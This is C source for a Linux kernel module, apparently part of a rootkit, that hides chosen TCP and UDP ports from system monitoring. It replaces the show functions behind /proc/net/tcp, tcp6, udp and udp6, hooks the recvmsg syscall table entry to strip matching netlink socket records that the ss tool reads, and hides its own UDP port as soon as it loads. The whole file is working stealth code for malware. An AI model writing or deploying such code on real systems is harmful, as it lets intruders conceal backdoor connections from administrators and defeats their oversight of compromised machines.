#include "utils.h"
#include "socket_hiding.h"

/* counter for accesses */
static int accesses_recvmsg = 0;
static int accesses_tcp4 = 0;
static int accesses_tcp6 = 0;
static int accesses_udp4 = 0;
static int accesses_udp6 = 0;

/* mutex for counting */
struct mutex lock_recvmsg;
struct mutex lock_tcp4;
struct mutex lock_tcp6;
struct mutex lock_udp4;
struct mutex lock_udp6;

struct data_node *tcp_node = NULL, *tcp6_node = NULL;
struct data_node *udp_node = NULL, *udp6_node = NULL;

int (*original_tcp4_show)(struct seq_file *m, void *v);
int (*original_tcp6_show)(struct seq_file *m, void *v);
int (*original_udp4_show)(struct seq_file *m, void *v);
int (*original_udp6_show)(struct seq_file *m, void *v);

asmlinkage ssize_t (*original_recvmsg)(int sockfd, 
	struct user_msghdr __user *msg, int flags);

struct data_node **socket_get_list(char *protocol)
{
	/* get node for specific protocol */
	if(!strcmp(protocol, "tcp4")) {
		debug("LIST IS TCP4");
		return &tcp_node;
	}else if(!strcmp(protocol, "tcp6")) {
		debug("LIST IS TCP6");
		return &tcp6_node;
	}else if(!strcmp(protocol, "udp4")) {
		debug("LIST IS UDP4");
		return &udp_node;
	}else if(!strcmp(protocol, "udp6")) {
		debug("LIST IS UDP6");
		return &udp6_node;
	}

	return NULL;
}

void insert_socket(struct data_node **head, int port)
{
	/* kmalloc for size of int */
	int *sn = kmalloc(sizeof(int), GFP_KERNEL);

	debug("INSERT NEW PORT %d", port);
	*sn = port;
	insert_data_node(head, (void *)sn);
}

void remove_socket(struct data_node **head, int port)
{
	struct data_node *node = find_data_node(head, (void *)&port, 
		sizeof(port));

	if(node != NULL) {
		int *sn = (int *)node->data;
		debug("PORT %d IN LIST, REMOVE PORT", port);

		kfree(sn);
		delete_data_node(head, node);

		return;
	}

	debug("PORT %d NOT IN LIST", port);
}

int find_socket(struct data_node **head, int port)
{
	return find_data_node(head, (void *)&port, sizeof(port)) != NULL;
}

int fake_tcp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	/* increase counter */
	inc_critical(&lock_tcp4, &accesses_tcp4);

	if(SEQ_START_TOKEN == v) {
		debug("SEQ_START_TOKEN == v, DROP");
		dec_critical(&lock_tcp4, &accesses_tcp4);
		return original_tcp4_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if(find_socket(&tcp_node, port)) {
		debug("PORT %d IN LIST, DROP", port);
		dec_critical(&lock_tcp4, &accesses_tcp4);
		return 0;
	}

	debug("PORT %d NOT IN LIST", port);
	dec_critical(&lock_tcp4, &accesses_tcp4);

	return original_tcp4_show(m, v);
}

int fake_tcp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	/* increase counter */
	inc_critical(&lock_tcp6, &accesses_tcp6);

	if(SEQ_START_TOKEN == v) {
		debug("SEQ_START_TOKEN == v, DROP");
		dec_critical(&lock_tcp6, &accesses_tcp6);
		return original_tcp6_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if(find_socket(&tcp6_node, port)) {
		debug("PORT %d IN LIST, DROP", port);
		dec_critical(&lock_tcp6, &accesses_tcp6);
		return 0;
	}

	debug("PORT %d NOT IN LIST", port);
	dec_critical(&lock_tcp6, &accesses_tcp6);

	return original_tcp6_show(m, v);
}

int fake_udp4_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	/* increase counter */
	inc_critical(&lock_udp4, &accesses_udp4);

	if(SEQ_START_TOKEN == v) {
		debug("SEQ_START_TOKEN == v, DROP");
		dec_critical(&lock_udp4, &accesses_udp4);
		return original_udp4_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if(find_socket(&udp_node, port)) {
		debug("PORT %d IN LIST, DROP", port);
		dec_critical(&lock_udp4, &accesses_udp4);
		return 0;
	}

	debug("PORT %d NOT IN LIST", port);
	dec_critical(&lock_udp4, &accesses_udp4);

	return original_udp4_show(m, v);
}

int fake_udp6_show(struct seq_file *m, void *v)
{
	struct inet_sock *inet;
	int port;

	/* increase counter */
	inc_critical(&lock_udp6, &accesses_udp6);

	if(SEQ_START_TOKEN == v) {
		debug("SEQ_START_TOKEN == v, DROP");
		dec_critical(&lock_udp6, &accesses_udp6);
		return original_udp6_show(m, v);
	}

	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

	if(find_socket(&udp6_node, port)) {
		debug("PORT %d IN LIST, DROP", port);
		dec_critical(&lock_udp6, &accesses_udp6);
		return 0;
	}

	debug("PORT %d NOT IN LIST", port);
	dec_critical(&lock_udp6, &accesses_udp6);

	return original_udp6_show(m, v);
}

int socket_check(struct nlmsghdr *hdr)
{
	int port;

	/* extract data from header */
	struct inet_diag_msg *r = NLMSG_DATA(hdr);
	port = ntohs(r->id.idiag_sport);

	if(find_socket(&tcp_node, port) 
		|| find_socket(&tcp6_node, port) 
		|| find_socket(&udp_node, port) 
		|| find_socket(&udp6_node, port)) {
		debug("PORT %d IN ONE LIST, NEEDS TO BE HIDDEN", port);
		return 1;
	}

	return 0;
}

asmlinkage ssize_t fake_recvmsg(int sockfd, struct user_msghdr __user *msg, 
	int flags)
{
	struct nlmsghdr *hdr;
	int found, offset, i;
	long count;
	char *stream;

	long ret = original_recvmsg(sockfd, msg, flags);

	/* increase counter */
	inc_critical(&lock_recvmsg, &accesses_recvmsg);

	if (ret < 0) {
		dec_critical(&lock_recvmsg, &accesses_recvmsg);
		return ret;
	}

	hdr = (struct nlmsghdr *)msg->msg_iov->iov_base;
	count = ret;

	/* indicates if it needs to be hidden */
	found = 1;

	/* see if header fits in rest of message */
	while(NLMSG_OK(hdr, count)) {
		if (found == 0)
			hdr = NLMSG_NEXT(hdr, count);

		/* retrieve data and check if it need to be hidden */
		if(!socket_check(hdr)) {
			/* no need to be hidden, next round */
			found = 0;
			continue;
		}

		/* needs to be hidden */
		found = 1;
		stream = (char *)hdr;

		/* rounded alignment  */
		offset = NLMSG_ALIGN(hdr->nlmsg_len);

		for (i = 0 ; i < count; i++)
			stream[i] = stream[i + offset];

		ret -= offset;
	}

	dec_critical(&lock_recvmsg, &accesses_recvmsg);

	return ret;
}

void socket_hide(char *protocol, int port)
{
	/* get node for this protocol */
	struct data_node **node = socket_get_list(protocol);

	/* no valid socket type */
	if(node == NULL) {
		debug("UNKNOWN PROTOCOL");
		return;
	}

	if(!find_socket(node, port)) {
		debug("PORT %d NOT IN LIST, INSERT NEW PORT", port);
		insert_socket(node, port);
		return;
	}

	debug("PORT %d ALREADY IN LIST", port);
}

void socket_unhide(char *protocol, int port)
{
	/* get node for this protocol */
	struct data_node **node = socket_get_list(protocol);

	/* no valid socket type */
	if(node == NULL) {
		debug("UNKNOWN PROTOCOL");
		return;
	}

	if(find_socket(node, port)) {
		debug("PORT %d IN LIST, REMOVE PORT", port);
		remove_socket(node, port);
		return;
	}

	debug("PORT %d NOT IN LIST", port);

}

int socket_hiding_init(void)
{
	/* 
	 * two sections:
	 *
	 * netstat recieves informations about the sockets via the 
	 * tcp, tcp6, udp and udp6 files in the /pric/<pid>/net directory
	 *
	 * ss recieves the messages via the recvmsg syscall.
	 */

	/* struct proc_dir_entry for every entry in out 
	 * /proc/<pid>/net directory 
	 */
	struct proc_dir_entry *proc_current;

	/* for every entry a temporary pointer to its data */
	struct tcp_seq_afinfo *tcp_data;
	struct udp_seq_afinfo *udp_data;

	/* needed for iterating through all entries */
	struct rb_root *root = &init_net.proc_net->subdir;
	struct rb_node *proc_node_current = rb_first(root);
	struct rb_node *proc_node_last = rb_last(root);

	debug("INITIALIZE SOCKET HIDING");

	/* initialize mutex */
	mutex_init(&lock_recvmsg);
	mutex_init(&lock_tcp4);
	mutex_init(&lock_tcp6);
	mutex_init(&lock_udp4);
	mutex_init(&lock_udp6);

	while(proc_node_current != proc_node_last) {
		/* get proc_dir_entry from current node */
		proc_current = rb_entry(proc_node_current, 
			struct proc_dir_entry, subdir_node);

		/*
		 * the name of the files are just as their protocol:
		 * tcp, tcp6, udp and udp6 (for ipv4 and ipv6) and
		 * modify every files show function
		 */
		if (!strcmp(proc_current->name, "tcp")) {
			tcp_data = proc_current->data;
			original_tcp4_show = tcp_data->seq_ops.show;
			tcp_data->seq_ops.show = fake_tcp4_show;
		} else if (!strcmp(proc_current->name, "tcp6")) {
			tcp_data = proc_current->data;
			original_tcp6_show = tcp_data->seq_ops.show;
			tcp_data->seq_ops.show = fake_tcp6_show;
		} else if  (!strcmp(proc_current->name, "udp")) {
			udp_data = proc_current->data;
			original_udp4_show = udp_data->seq_ops.show;
			udp_data->seq_ops.show = fake_udp4_show;
		} else if (!strcmp(proc_current->name, "udp6")) {
			udp_data = proc_current->data;
			original_udp6_show = udp_data->seq_ops.show;
			udp_data->seq_ops.show = fake_udp6_show;
		}

		proc_node_current = rb_next(proc_node_current);
	}

	disable_page_protection();
	original_recvmsg = (void *)table_ptr[__NR_recvmsg];
	table_ptr[__NR_recvmsg] = (unsigned long*)fake_recvmsg;
	enable_page_protection();

	/* immediately hide our socket */
	socket_hide("udp4", UDP_PORT);

	return 0;
}

void socket_hiding_exit(void)
{
	struct proc_dir_entry *proc_current;

	struct tcp_seq_afinfo *tcp_data;
	struct udp_seq_afinfo *udp_data;

	struct rb_root *root = &init_net.proc_net->subdir;
	struct rb_node *proc_node_current = rb_first(root);
	struct rb_node *proc_node_last = rb_last(root);

	debug("EXIT SOCKET HIDING");

	/* free socket lists */
	free_data_node_list(&tcp_node);
	free_data_node_list(&tcp6_node);
	free_data_node_list(&udp_node);
	free_data_node_list(&udp6_node);

	while(proc_node_current != proc_node_last) {

		proc_current = rb_entry(proc_node_current, 
			struct proc_dir_entry, subdir_node);

		/* reset show function for all entries */
		if (!strcmp(proc_current->name, "tcp")) {
			tcp_data = proc_current->data;
			tcp_data->seq_ops.show = original_tcp4_show;
		} else if (!strcmp(proc_current->name, "tcp6")) {
			tcp_data = proc_current->data;
			tcp_data->seq_ops.show = original_tcp6_show;
		} else if  (!strcmp(proc_current->name, "udp")) {
			udp_data = proc_current->data;
			udp_data->seq_ops.show = original_udp4_show;
		} else if (!strcmp(proc_current->name, "udp6")) {
			udp_data = proc_current->data;
			udp_data->seq_ops.show = original_udp6_show;
		}

		proc_node_current = rb_next(proc_node_current);
	}

	disable_page_protection();
	table_ptr[__NR_recvmsg] = (unsigned long*)original_recvmsg;
	enable_page_protection();

	/* prevent segfault when unloading */
	while(accesses_recvmsg > 0 
		|| accesses_tcp4 > 0 
		|| accesses_tcp6 > 0 
		|| accesses_udp4 > 0 
		|| accesses_udp6 > 0)
		msleep(50);
}

MODULE_LICENSE("GPL");